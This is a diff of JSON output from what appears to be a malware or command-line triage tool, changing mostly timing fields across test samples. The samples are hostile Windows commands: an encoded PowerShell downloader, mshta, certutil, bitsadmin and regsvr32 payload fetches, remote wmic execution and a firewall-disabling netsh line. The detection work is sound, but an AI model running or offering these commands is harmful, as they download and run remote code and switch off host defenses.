@@ -197,11 +197,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.113,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "PowerShell base64-encoded command execution",
@@ -229,7 +224,7 @@
               }
             ]
           },
-          "elapsed_ms": 192.2,
+          "elapsed_ms": 194.9,
           "status": 200
         },
         "die": {
@@ -584,7 +579,7 @@
               ]
             }
           },
-          "elapsed_ms": 188.5,
+          "elapsed_ms": 141.2,
           "status": 200
         },
         "narrate": {
@@ -649,7 +644,7 @@
               ]
             }
           },
-          "elapsed_ms": 147.1,
+          "elapsed_ms": 101.0,
           "status": 200
         },
         "upload": {
@@ -677,7 +672,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 191.7,
+          "elapsed_ms": 186.3,
           "status": 200
         }
       },
@@ -738,11 +733,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.107,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "PowerShell base64-encoded command execution",
@@ -770,7 +760,7 @@
               }
             ]
           },
-          "elapsed_ms": 154.6,
+          "elapsed_ms": 190.1,
           "status": 200
         },
         "die": {
@@ -1125,7 +1115,7 @@
               ]
             }
           },
-          "elapsed_ms": 133.7,
+          "elapsed_ms": 109.7,
           "status": 200
         },
         "narrate": {
@@ -1190,7 +1180,7 @@
               ]
             }
           },
-          "elapsed_ms": 106.8,
+          "elapsed_ms": 96.9,
           "status": 200
         },
         "upload": {
@@ -1218,7 +1208,7 @@
             ],
             "text": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA"
           },
-          "elapsed_ms": 273.7,
+          "elapsed_ms": 132.1,
           "status": 200
         }
       }
@@ -1383,11 +1373,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 501.087,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "Remote HTA execution",
@@ -1403,7 +1388,7 @@
               }
             ]
           },
-          "elapsed_ms": 681.6,
+          "elapsed_ms": 1209.0,
           "status": 200
         },
         "die": {
@@ -1589,7 +1574,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 105.7,
+          "elapsed_ms": 108.7,
           "status": 200
         },
         "narrate": {
@@ -1623,7 +1608,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 93.9,
+          "elapsed_ms": 135.5,
           "status": 200
         },
         "upload": {
@@ -1651,7 +1636,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 100.1,
+          "elapsed_ms": 137.9,
           "status": 200
         }
       },
@@ -1710,11 +1695,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 501.525,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "Remote HTA execution",
@@ -1730,7 +1710,7 @@
               }
             ]
           },
-          "elapsed_ms": 652.8,
+          "elapsed_ms": 845.4,
           "status": 200
         },
         "die": {
@@ -1916,7 +1896,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 190.2,
+          "elapsed_ms": 94.0,
           "status": 200
         },
         "narrate": {
@@ -1950,7 +1930,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 94.5,
+          "elapsed_ms": 177.7,
           "status": 200
         },
         "upload": {
@@ -1978,7 +1958,7 @@
             ],
             "text": "mshta.exe http://198.51.100.23/dropper.hta"
           },
-          "elapsed_ms": 133.9,
+          "elapsed_ms": 108.5,
           "status": 200
         }
       }
@@ -2174,11 +2154,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 501.534,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -2188,7 +2163,7 @@
               }
             ]
           },
-          "elapsed_ms": 652.6,
+          "elapsed_ms": 1101.4,
           "status": 200
         },
         "die": {
@@ -2409,7 +2384,7 @@
               ]
             }
           },
-          "elapsed_ms": 113.9,
+          "elapsed_ms": 96.5,
           "status": 200
         },
         "narrate": {
@@ -2469,7 +2444,7 @@
               ]
             }
           },
-          "elapsed_ms": 102.8,
+          "elapsed_ms": 99.8,
           "status": 200
         },
         "upload": {
@@ -2497,7 +2472,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 100.1,
+          "elapsed_ms": 110.3,
           "status": 200
         }
       },
@@ -2571,11 +2546,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 501.82,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -2585,7 +2555,7 @@
               }
             ]
           },
-          "elapsed_ms": 655.5,
+          "elapsed_ms": 1060.6,
           "status": 200
         },
         "die": {
@@ -2806,7 +2776,7 @@
               ]
             }
           },
-          "elapsed_ms": 109.2,
+          "elapsed_ms": 145.5,
           "status": 200
         },
         "narrate": {
@@ -2866,7 +2836,7 @@
               ]
             }
           },
-          "elapsed_ms": 93.1,
+          "elapsed_ms": 98.2,
           "status": 200
         },
         "upload": {
@@ -2894,7 +2864,7 @@
             ],
             "text": "certutil.exe -urlcache -split -f http://203.0.113.15/payload.exe C:\\Users\\Public\\update.exe"
           },
-          "elapsed_ms": 99.8,
+          "elapsed_ms": 127.1,
           "status": 200
         }
       }
@@ -3074,11 +3044,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 501.723,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -3088,7 +3053,7 @@
               }
             ]
           },
-          "elapsed_ms": 650.7,
+          "elapsed_ms": 920.4,
           "status": 200
         },
         "die": {
@@ -3341,7 +3306,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 110.0,
+          "elapsed_ms": 99.7,
           "status": 200
         },
         "narrate": {
@@ -3394,7 +3359,7 @@
               ]
             }
           },
-          "elapsed_ms": 95.8,
+          "elapsed_ms": 93.8,
           "status": 200
         },
         "upload": {
@@ -3422,7 +3387,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 156.2,
+          "elapsed_ms": 99.4,
           "status": 200
         }
       },
@@ -3494,11 +3459,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 501.588,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -3508,7 +3468,7 @@
               }
             ]
           },
-          "elapsed_ms": 648.1,
+          "elapsed_ms": 1144.5,
           "status": 200
         },
         "die": {
@@ -3761,7 +3721,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 117.8,
+          "elapsed_ms": 97.1,
           "status": 200
         },
         "narrate": {
@@ -3814,7 +3774,7 @@
               ]
             }
           },
-          "elapsed_ms": 92.4,
+          "elapsed_ms": 98.6,
           "status": 200
         },
         "upload": {
@@ -3842,7 +3802,7 @@
             ],
             "text": "regsvr32.exe /s /n /u /i:http://198.51.100.99/backdoor.sct scrobj.dll"
           },
-          "elapsed_ms": 98.8,
+          "elapsed_ms": 97.6,
           "status": 200
         }
       }
@@ -4086,11 +4046,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 501.389,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "PowerShell hidden window flag",
@@ -4118,7 +4073,7 @@
               }
             ]
           },
-          "elapsed_ms": 647.6,
+          "elapsed_ms": 839.0,
           "status": 200
         },
         "die": {
@@ -4523,7 +4478,7 @@
               ]
             }
           },
-          "elapsed_ms": 96.6,
+          "elapsed_ms": 200.5,
           "status": 200
         },
         "narrate": {
@@ -4599,7 +4554,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.8,
+          "elapsed_ms": 98.4,
           "status": 200
         },
         "upload": {
@@ -4627,7 +4582,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 103.9,
+          "elapsed_ms": 104.8,
           "status": 200
         }
       },
@@ -4725,11 +4680,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 519.541,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "PowerShell hidden window flag",
@@ -4757,7 +4707,7 @@
               }
             ]
           },
-          "elapsed_ms": 674.3,
+          "elapsed_ms": 650.1,
           "status": 200
         },
         "die": {
@@ -5162,7 +5112,7 @@
               ]
             }
           },
-          "elapsed_ms": 108.1,
+          "elapsed_ms": 103.6,
           "status": 200
         },
         "narrate": {
@@ -5238,7 +5188,7 @@
               ]
             }
           },
-          "elapsed_ms": 99.7,
+          "elapsed_ms": 130.0,
           "status": 200
         },
         "upload": {
@@ -5266,7 +5216,7 @@
             ],
             "text": "wmic.exe /node:\"WORKSTATION-04\" process call create \"cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.7/b.ps1')\""
           },
-          "elapsed_ms": 143.4,
+          "elapsed_ms": 120.7,
           "status": 200
         }
       }
@@ -5379,11 +5329,6 @@
               "verdict": "Benign"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.137,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -5393,7 +5338,7 @@
               }
             ]
           },
-          "elapsed_ms": 155.5,
+          "elapsed_ms": 152.1,
           "status": 200
         },
         "die": {
@@ -5410,7 +5355,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 97.9,
+          "elapsed_ms": 100.3,
           "status": 200
         },
         "narrate": {
@@ -5425,7 +5370,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 100.9,
+          "elapsed_ms": 99.1,
           "status": 200
         },
         "upload": {
@@ -5453,7 +5398,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 101.9,
+          "elapsed_ms": 105.0,
           "status": 200
         }
       },
@@ -5488,11 +5433,6 @@
               "verdict": "Benign"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.087,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -5502,7 +5442,7 @@
               }
             ]
           },
-          "elapsed_ms": 183.7,
+          "elapsed_ms": 153.0,
           "status": 200
         },
         "die": {
@@ -5519,7 +5459,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 111.7,
+          "elapsed_ms": 98.3,
           "status": 200
         },
         "narrate": {
@@ -5534,7 +5474,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 89.5,
+          "elapsed_ms": 96.3,
           "status": 200
         },
         "upload": {
@@ -5562,7 +5502,7 @@
             ],
             "text": "Get-ChildItem -Path \"C:\\Users\\jsmith\\Documents\" -Recurse -Include *.docx | Select-Object Name, Length, LastWriteTime | Export-Csv -Path \"C:\\Temp\\docs.csv\" -NoTypeInformation"
           },
-          "elapsed_ms": 99.0,
+          "elapsed_ms": 99.3,
           "status": 200
         }
       }
@@ -5711,11 +5651,6 @@
               "verdict": "Low Risk"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.097,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -5725,7 +5660,7 @@
               }
             ]
           },
-          "elapsed_ms": 196.7,
+          "elapsed_ms": 162.7,
           "status": 200
         },
         "die": {
@@ -5820,7 +5755,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.7,
+          "elapsed_ms": 97.1,
           "status": 200
         },
         "narrate": {
@@ -5853,7 +5788,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 117.7,
+          "elapsed_ms": 93.2,
           "status": 200
         },
         "upload": {
@@ -5881,7 +5816,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 99.3,
+          "elapsed_ms": 159.9,
           "status": 200
         }
       },
@@ -5932,11 +5867,6 @@
               "verdict": "Low Risk"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.099,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -5946,7 +5876,7 @@
               }
             ]
           },
-          "elapsed_ms": 148.9,
+          "elapsed_ms": 155.9,
           "status": 200
         },
         "die": {
@@ -6041,7 +5971,7 @@
               ]
             }
           },
-          "elapsed_ms": 143.3,
+          "elapsed_ms": 97.6,
           "status": 200
         },
         "narrate": {
@@ -6074,7 +6004,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 114.9,
+          "elapsed_ms": 96.3,
           "status": 200
         },
         "upload": {
@@ -6102,7 +6032,7 @@
             ],
             "text": "netsh advfirewall set allprofiles state off"
           },
-          "elapsed_ms": 98.1,
+          "elapsed_ms": 109.5,
           "status": 200
         }
       }
@@ -6297,11 +6227,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.099,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "PowerShell hidden window flag",
@@ -6329,7 +6254,7 @@
               }
             ]
           },
-          "elapsed_ms": 151.9,
+          "elapsed_ms": 151.7,
           "status": 200
         },
         "die": {
@@ -6646,7 +6571,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.1,
+          "elapsed_ms": 101.3,
           "status": 200
         },
         "narrate": {
@@ -6722,7 +6647,7 @@
               ]
             }
           },
-          "elapsed_ms": 96.4,
+          "elapsed_ms": 96.1,
           "status": 200
         },
         "upload": {
@@ -6750,7 +6675,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 102.6,
+          "elapsed_ms": 102.7,
           "status": 200
         }
       },
@@ -6811,11 +6736,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.096,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "PowerShell hidden window flag",
@@ -6843,7 +6763,7 @@
               }
             ]
           },
-          "elapsed_ms": 154.2,
+          "elapsed_ms": 154.4,
           "status": 200
         },
         "die": {
@@ -7160,7 +7080,7 @@
               ]
             }
           },
-          "elapsed_ms": 101.8,
+          "elapsed_ms": 96.5,
           "status": 200
         },
         "narrate": {
@@ -7236,7 +7156,7 @@
               ]
             }
           },
-          "elapsed_ms": 102.8,
+          "elapsed_ms": 106.0,
           "status": 200
         },
         "upload": {
@@ -7264,7 +7184,7 @@
             ],
             "text": "powershell -nop -w hidden -c \"$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtRW5jIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURJQU1nQXpBQzRBTVRBQUxnQXhBRElBTHdCcEFHNEFad0FuQUNrQQ=='));iex $s\""
           },
-          "elapsed_ms": 97.4,
+          "elapsed_ms": 103.1,
           "status": 200
         }
       }
@@ -7367,14 +7287,9 @@
               "verdict": "Benign"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.113,
-              "status": "ok"
-            },
             "yara": []
           },
-          "elapsed_ms": 151.7,
+          "elapsed_ms": 150.7,
           "status": 200
         },
         "die": {
@@ -7391,7 +7306,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 94.7,
+          "elapsed_ms": 95.7,
           "status": 200
         },
         "narrate": {
@@ -7406,7 +7321,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 92.0,
+          "elapsed_ms": 96.8,
           "status": 200
         },
         "upload": {
@@ -7432,7 +7347,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 100.7,
+          "elapsed_ms": 105.0,
           "status": 200
         }
       },
@@ -7461,14 +7376,9 @@
               "verdict": "Benign"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.103,
-              "status": "ok"
-            },
             "yara": []
           },
-          "elapsed_ms": 149.1,
+          "elapsed_ms": 160.0,
           "status": 200
         },
         "die": {
@@ -7485,7 +7395,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 96.9,
+          "elapsed_ms": 106.2,
           "status": 200
         },
         "narrate": {
@@ -7500,7 +7410,7 @@
               "yara_ideas": []
             }
           },
-          "elapsed_ms": 95.3,
+          "elapsed_ms": 93.8,
           "status": 200
         },
         "upload": {
@@ -7526,7 +7436,7 @@
             "strings": [],
             "text": "dir"
           },
-          "elapsed_ms": 97.7,
+          "elapsed_ms": 100.1,
           "status": 200
         }
       }
@@ -7605,7 +7515,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 97.5,
+          "elapsed_ms": 159.6,
           "status": 200
         },
         "narrate": {
@@ -7635,7 +7545,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 95.2,
+          "elapsed_ms": 101.8,
           "status": 200
         }
       },
@@ -7658,7 +7568,7 @@
               "techniques": []
             }
           },
-          "elapsed_ms": 93.7,
+          "elapsed_ms": 118.6,
           "status": 200
         },
         "narrate": {
@@ -7688,7 +7598,7 @@
             "strings": [],
             "text": null
           },
-          "elapsed_ms": 107.7,
+          "elapsed_ms": 195.4,
           "status": 200
         }
       }
@@ -7873,11 +7783,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 502.31,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -7887,7 +7792,7 @@
               }
             ]
           },
-          "elapsed_ms": 654.5,
+          "elapsed_ms": 1135.2,
           "status": 200
         },
         "die": {
@@ -8106,7 +8011,7 @@
               ]
             }
           },
-          "elapsed_ms": 98.2,
+          "elapsed_ms": 97.1,
           "status": 200
         },
         "narrate": {
@@ -8166,7 +8071,7 @@
               ]
             }
           },
-          "elapsed_ms": 96.4,
+          "elapsed_ms": 92.3,
           "status": 200
         },
         "upload": {
@@ -8194,7 +8099,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 98.3,
+          "elapsed_ms": 101.1,
           "status": 200
         }
       },
@@ -8259,11 +8164,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 501.635,
-              "status": "timeout"
-            },
             "yara": [
               {
                 "description": "Alternating-case keyword obfuscation to evade string-signature detection",
@@ -8273,7 +8173,7 @@
               }
             ]
           },
-          "elapsed_ms": 650.5,
+          "elapsed_ms": 806.1,
           "status": 200
         },
         "die": {
@@ -8492,7 +8392,7 @@
               ]
             }
           },
-          "elapsed_ms": 94.0,
+          "elapsed_ms": 99.2,
           "status": 200
         },
         "narrate": {
@@ -8552,7 +8452,7 @@
               ]
             }
           },
-          "elapsed_ms": 97.1,
+          "elapsed_ms": 100.8,
           "status": 200
         },
         "upload": {
@@ -8580,7 +8480,7 @@
             ],
             "text": "bitsadmin.exe /transfer job1 /priority foreground http://198.51.100.42/m.exe C:\\ProgramData\\m.exe"
           },
-          "elapsed_ms": 95.6,
+          "elapsed_ms": 99.4,
           "status": 200
         }
       }
@@ -8756,11 +8656,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.082,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "JavaScript eval() invocation",
@@ -8776,7 +8671,7 @@
               }
             ]
           },
-          "elapsed_ms": 149.0,
+          "elapsed_ms": 151.5,
           "status": 200
         },
         "die": {
@@ -9212,7 +9107,7 @@
               ]
             }
           },
-          "elapsed_ms": 105.2,
+          "elapsed_ms": 95.8,
           "status": 200
         },
         "narrate": {
@@ -9270,7 +9165,7 @@
               ]
             }
           },
-          "elapsed_ms": 112.8,
+          "elapsed_ms": 93.7,
           "status": 200
         },
         "upload": {
@@ -9298,7 +9193,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 101.9,
+          "elapsed_ms": 150.1,
           "status": 200
         }
       },
@@ -9358,11 +9253,6 @@
               "verdict": "Malicious"
             },
             "ti_hits": [],
-            "ti_lookup_meta": {
-              "deadline_ms": 500.0,
-              "elapsed_ms": 0.099,
-              "status": "ok"
-            },
             "yara": [
               {
                 "description": "JavaScript eval() invocation",
@@ -9378,7 +9268,7 @@
               }
             ]
           },
-          "elapsed_ms": 151.7,
+          "elapsed_ms": 156.7,
           "status": 200
         },
         "die": {
@@ -9814,7 +9704,7 @@
               ]
             }
           },
-          "elapsed_ms": 94.7,
+          "elapsed_ms": 91.2,
           "status": 200
         },
         "narrate": {
@@ -9872,7 +9762,7 @@
               ]
             }
           },
-          "elapsed_ms": 90.4,
+          "elapsed_ms": 94.8,
           "status": 200
         },
         "upload": {
@@ -9900,7 +9790,7 @@
             ],
             "text": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write(\"\\74script language=jscript>eval(new ActiveXObject(\\\"WScript.Shell\\\").RegRead(\\\"HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run\\\\\\\\evil\\\"));\\74/script>\")"
           },
-          "elapsed_ms": 107.1,
+          "elapsed_ms": 140.4,
           "status": 200
         }
       }
